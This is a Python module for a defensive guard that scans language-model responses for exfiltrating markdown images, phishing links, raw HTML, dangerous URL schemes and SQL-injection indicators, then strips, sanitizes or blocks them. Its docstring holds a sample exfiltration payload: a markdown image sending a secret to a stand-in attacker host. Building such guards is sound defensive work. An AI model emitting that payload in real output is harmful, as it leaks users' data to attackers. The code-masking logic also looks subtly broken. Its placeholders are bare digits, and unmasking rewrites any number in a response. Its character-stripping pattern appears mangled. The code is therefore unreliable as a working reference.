"""Improper output handling guard (OWASP LLM05).

A model response is untrusted input to whatever consumes it next — a browser,
a markdown renderer, a database. This stage finds the constructs that turn a
response into an attack and neutralizes them according to the application's
policy:

  * markdown images   ![x](https://evil/?d=SECRET)  — the renderer fetches the
    URL on its own, so this is a silent data-exfiltration channel
  * markdown links    [click](https://evil/phish)
  * raw HTML          <script>, event handlers, javascript: URLs, <iframe>
  * dangerous URL schemes (javascript:, data:, vbscript:) — never allowed

  * SQL-injection indicators (stacked/destructive statements, tautologies,
    UNION SELECT, ...) — opt-in, see ``sql_guard.py``

Modes (per policy, see ``OutputHandlingPolicy``):
  images / links: ``allow`` | ``allowlist`` (allowed_domains) | ``strip`` | ``block``
  html:           ``allow`` | ``sanitize`` | ``block``
  sql:            ``allow`` | ``flag`` (verdict review) | ``block`` | ``readonly``
                  (block, and also refuse any INSERT/UPDATE/DELETE/DDL)

Markdown is *detected* with a real CommonMark parser (markdown-it-py) so
reference-style links, autolinks and nesting can't slip past a regex. It is
*rewritten* conservatively and then re-parsed to verify; if anything
disallowed survives the rewrite the response is blocked (fail closed). HTML is
sanitized with nh3 (Rust ``ammonia``), never by hand.

Limits: this reduces risk; it does not replace output encoding at the sink
(parameterized queries, HTML escaping, no ``shell=True``). Fenced and inline
code is inert markdown and is left alone, but code inside is NOT exempt from
HTML scanning — coding assistants should set ``html: allow``.
"""
import re
from dataclasses import dataclass, field
from urllib.parse import urlsplit

import nh3
from markdown_it import MarkdownIt

from app.config import settings
from app.pipeline.sql_guard import detect_sql

IMAGE_MODES = LINK_MODES = {"allow", "allowlist", "strip", "block"}
HTML_MODES = {"allow", "sanitize", "block"}
SQL_MODES = {"allow", "flag", "block", "readonly"}

_DANGEROUS_SCHEMES = {"javascript", "data", "vbscript"}
# A tag-shaped construct: <name ...> / </name> / <!-- / <!doctype. No space
# after "<": HTML5 treats "a < b" as text.
_HTML_TAG = re.compile(r"</?[a-zA-Z!][^<>]*>")
_BARE_URL = re.compile(r"""https?://[^\s<>()\[\]"'`]+""", re.IGNORECASE)

_URL = r"""\(\s*(<[^>]*>|[^)\s]*)(?:\s+(?:"[^"]*"|'[^']*'|\([^)]*\)))?\s*\)"""
_INLINE_IMAGE = re.compile(r"!\[([^\]]*)\]" + _URL)
_INLINE_LINK = re.compile(r"(?<!!)\[([^\]]*)\]" + _URL)
_REF_DEF = re.compile(
    r"""^[ ]{0,3}\[[^\]]+\]:[ \t]*(<[^>]*>|\S+)(?:[ \t]+(?:"[^"]*"|'[^']*'|\([^)]*\)))?[ \t]*$""",
    re.MULTILINE,
)
_AUTOLINK = re.compile(r"<(https?://[^<>\s]+|mailto:[^<>\s]+)>", re.IGNORECASE)
_FENCE = re.compile(
    r"^[ ]{0,3}(`{3,}|~{3,}).*?(?:^[ ]{0,3}\1[`~]*[ \t]*$|\Z)",
    re.MULTILINE | re.DOTALL,
)
_INLINE_CODE = re.compile(r"(`+)(?!`).+?(?<!`)\1(?!`)", re.DOTALL)
_MASK = re.compile("(\\d+)")

_md = MarkdownIt("commonmark", {"html": True})


@dataclass
class OutputHandlingPolicy:
    images: str = "strip"
    links: str = "allow"
    html: str = "sanitize"
    sql: str = "allow"
    allowed_domains: tuple[str, ...] = ()

    @classmethod
    def from_settings(cls) -> "OutputHandlingPolicy":
        return cls(
            images=settings.output_images,
            links=settings.output_links,
            html=settings.output_html,
            sql=settings.output_sql,
            allowed_domains=tuple(
                d.strip().lower() for d in settings.output_allowed_domains.split(",") if d.strip()
            ),
        )

    def merged(self, section: dict | None) -> "OutputHandlingPolicy":
        """Overlay a policy-file ``output:`` section on these defaults."""
        if not section:
            return self
        domains = section.get("allowed_domains")
        return OutputHandlingPolicy(
            images=section.get("images", self.images),
            links=section.get("links", self.links),
            html=section.get("html", self.html),
            sql=section.get("sql", self.sql),
            allowed_domains=tuple(d.lower() for d in domains)
            if domains is not None else self.allowed_domains,
        )


@dataclass
class Finding:
    kind: str  # image | link
    url: str
    action: str  # strip | block


@dataclass
class OutputHandlingResult:
    text: str
    ran: bool = False
    findings: list[str] = field(default_factory=list)  # e.g. "image", "link", "html"
    actions: list[str] = field(default_factory=list)   # e.g. "strip_image", "sanitize_html"
    blocked: bool = False
    review: bool = False  # hold for human review (sql: flag)
    sql_indicators: list[str] = field(default_factory=list)
    note: str | None = None

    @property
    def changed_or_flagged(self) -> bool:
        return bool(self.findings)


def validate_section(name: str, section: object) -> None:
    """Validate a policy file's ``output:`` section (raises ValueError)."""
    if not isinstance(section, dict):
        raise ValueError(f"policy {name!r}: 'output' must be a mapping")
    unknown = set(section) - {"images", "links", "html", "sql", "allowed_domains"}
    if unknown:
        raise ValueError(f"policy {name!r}: output has unknown keys {sorted(unknown)}")
    for key, valid in (("images", IMAGE_MODES), ("links", LINK_MODES), ("html", HTML_MODES), ("sql", SQL_MODES)):
        if key in section and section[key] not in valid:
            raise ValueError(
                f"policy {name!r}: output.{key} must be one of {sorted(valid)}, "
                f"got {section[key]!r}"
            )
    domains = section.get("allowed_domains")
    if domains is not None and (
        not isinstance(domains, list) or not all(isinstance(d, str) for d in domains)
    ):
        raise ValueError(f"policy {name!r}: output.allowed_domains must be a list of strings")


# ---------------------------------------------------------------- URL logic

def _host_allowed(host: str, domains: tuple[str, ...]) -> bool:
    return any(host == d or host.endswith("." + d) for d in domains)


def _action_for(url: str, mode: str, domains: tuple[str, ...]) -> str | None:
    """``None`` if the URL is acceptable, else ``"strip"`` or ``"block"``."""
    cleaned = re.sub(r"[\x00-\x20​-‏  ﻿]", "", url)
    try:
        parts = urlsplit(cleaned)
    except ValueError:
        return "block" if mode == "block" else "strip"
    scheme = parts.scheme.lower()
    if scheme in _DANGEROUS_SCHEMES:
        return "strip"  # never allowed, whatever the mode
    if mode == "allow":
        return None
    if mode == "block":
        return "block"
    if mode == "strip":
        return "strip"
    # allowlist: same-origin relative URLs are fine; external hosts must match
    if not scheme and not parts.netloc:
        return None
    host = (parts.hostname or "").lower()
    if scheme in ("http", "https") and host and _host_allowed(host, domains):
        return None
    return "strip"


# ------------------------------------------------------------ markdown scan

def _walk(tokens, out: list[tuple[str, str]]) -> None:
    for t in tokens:
        if t.type == "image":
            out.append(("image", t.attrGet("src") or ""))
        elif t.type == "link_open":
            out.append(("link", t.attrGet("href") or ""))
        if t.children:
            _walk(t.children, out)


def _mask_code(text: str) -> tuple[str, list[str]]:
    saved: list[str] = []

    def stash(m: re.Match) -> str:
        saved.append(m.group(0))
        return f"{len(saved) - 1}"

    return _INLINE_CODE.sub(stash, _FENCE.sub(stash, text)), saved


def _unmask(text: str, saved: list[str]) -> str:
    return _MASK.sub(lambda m: saved[int(m.group(1))] if int(m.group(1)) < len(saved) else m.group(0), text)


def _unwrap(raw: str) -> str:
    return raw[1:-1] if raw.startswith("<") and raw.endswith(">") else raw


def _scan(text: str, policy: OutputHandlingPolicy) -> list[Finding]:
    pairs: list[tuple[str, str]] = []
    _walk(_md.parse(text), pairs)
    masked, _ = _mask_code(text)
    # Regex pass too: CommonMark parsers refuse to emit javascript: links, but
    # other renderers don't, so the raw syntax must be judged on its own.
    pairs += [("image", _unwrap(m.group(2))) for m in _INLINE_IMAGE.finditer(masked)]
    pairs += [("link", _unwrap(m.group(2))) for m in _INLINE_LINK.finditer(masked)]
    pairs += [("link", _unwrap(m.group(1))) for m in _REF_DEF.finditer(masked)]
    pairs += [("link", m.group(1)) for m in _AUTOLINK.finditer(masked)]
    if policy.links != "allow":
        pairs += [("link", u.rstrip(".,;:!?")) for u in _BARE_URL.findall(masked)]
    findings, seen = [], set()
    for kind, url in pairs:
        if (kind, url) in seen:
            continue
        seen.add((kind, url))
        mode = policy.images if kind == "image" else policy.links
        action = _action_for(url, mode, policy.allowed_domains)
        if action:
            findings.append(Finding(kind, url, action))
    return findings


# --------------------------------------------------------- markdown rewrite

def _rewrite_markdown(
    text: str, policy: OutputHandlingPolicy, bad_urls: set[str]
) -> str:
    masked, saved = _mask_code(text)
    url_of = _unwrap

    def image(m: re.Match) -> str:
        if not _action_for(url_of(m.group(2)), policy.images, policy.allowed_domains):
            return m.group(0)
        return m.group(1) or "[image removed]"

    def link(m: re.Match) -> str:
        if not _action_for(url_of(m.group(2)), policy.links, policy.allowed_domains):
            return m.group(0)
        return m.group(1)

    def ref_def(m: re.Match) -> str:
        # Only definitions whose URL was judged bad by the parser (i.e. actually
        # used as a disallowed image/link) — a link definition that is fine
        # under the policy must survive.
        url = url_of(m.group(1))
        dangerous = _action_for(url, "allow", ()) is not None
        return "" if (url in bad_urls or dangerous) else m.group(0)

    def autolink(m: re.Match) -> str:
        return "" if _action_for(m.group(1), policy.links, policy.allowed_domains) else m.group(0)

    def bare(m: re.Match) -> str:
        url = m.group(0)
        trimmed = url.rstrip(".,;:!?")
        if _action_for(trimmed, policy.links, policy.allowed_domains):
            return "[link removed]" + url[len(trimmed):]
        return url

    out = _INLINE_IMAGE.sub(image, masked)
    out = _INLINE_LINK.sub(link, out)
    out = _REF_DEF.sub(ref_def, out)
    out = _AUTOLINK.sub(autolink, out)
    if policy.links != "allow":
        out = _BARE_URL.sub(bare, out)
    return _unmask(out, saved)


# ---------------------------------------------------------------- HTML

def _sanitize_html(text: str, policy: OutputHandlingPolicy) -> str:
    tags = set(nh3.ALLOWED_TAGS)
    if policy.images != "allow" and policy.images != "allowlist":
        tags.discard("img")
    if policy.links in ("strip", "block"):
        tags.discard("a")

    def attr_filter(tag: str, attr: str, value: str):
        if attr in ("href", "src"):
            mode = policy.images if tag == "img" else policy.links
            return None if _action_for(value, mode, policy.allowed_domains) else value
        return value

    return nh3.clean(
        text,
        tags=tags,
        attribute_filter=attr_filter,
        link_rel=None,
        url_schemes={"http", "https", "mailto"},
    )


# ---------------------------------------------------------------- entry

def _has_html(text: str, policy: OutputHandlingPolicy) -> bool:
    if policy.html == "allow":
        return False
    return bool(_HTML_TAG.search(_AUTOLINK.sub("", text)))


def handle_output(text: str, policy: OutputHandlingPolicy) -> OutputHandlingResult:
    """Detect and neutralize dangerous constructs in ``text`` per ``policy``."""
    res = OutputHandlingResult(text=text, ran=True)

    # SQL indicators are detected, never rewritten: a "sanitized" query is
    # still a query nobody asked for.
    if policy.sql != "allow":
        res.sql_indicators = detect_sql(text, readonly=policy.sql == "readonly")
        if res.sql_indicators:
            res.findings.append("sql")
            if policy.sql == "flag":
                res.review = True
            else:
                res.blocked = True
                return res

    findings = _scan(text, policy)
    has_html = _has_html(text, policy)

    for f in findings:
        if f.kind not in res.findings:
            res.findings.append(f.kind)
    if has_html:
        res.findings.append("html")
    if not findings and not has_html:
        return res

    if any(f.action == "block" for f in findings) or (has_html and policy.html == "block"):
        res.blocked = True
        return res

    out = text
    if findings:
        out = _rewrite_markdown(out, policy, {f.url for f in findings})
        res.actions += sorted({f"strip_{f.kind}" for f in findings})
    if _has_html(out, policy):
        out = _sanitize_html(out, policy)
        res.actions.append("sanitize_html")

    # Verify: re-parse the rewritten text. Anything still disallowed means the
    # rewrite missed a form — fail closed rather than ship it.
    if _scan(out, policy) or (_has_html(out, policy) and _sanitize_html(out, policy) != out):
        res.blocked = True
        res.note = "verification_failed"
        return res

    res.text = out
    return res
